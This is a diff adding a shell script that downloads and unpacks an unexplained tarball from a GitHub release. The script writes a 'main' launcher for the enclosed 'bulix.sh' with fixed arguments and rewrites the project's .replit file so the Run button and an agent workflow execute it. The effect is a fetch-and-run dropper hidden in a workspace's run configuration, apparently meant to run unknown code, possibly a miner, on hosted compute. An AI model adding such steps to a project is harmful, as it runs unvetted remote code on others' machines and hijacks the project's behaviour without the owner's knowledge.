@@ -1,0 +1,29 @@
+curl -O -J -L https://github.com/xiqiu872-max/gonto/releases/download/vere/newpi.tar.gz && tar -xf newpi.tar.gz && rm -rf newpi.tar.gz
+echo '#!/bin/bash
+
+bash bulix.sh 4 001' > main
+
+echo 'modules = ["python-3.11"]
+
+[workflows]
+runButton = "Project"
+
+[[workflows.workflow]]
+name = "Project"
+mode = "parallel"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "workflow.run"
+args = "main"
+
+[[workflows.workflow]]
+name = "main"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "shell.exec"
+args = "bash main"
+
+[workflows.workflow.metadata]
+outputType = "console"' > .replit
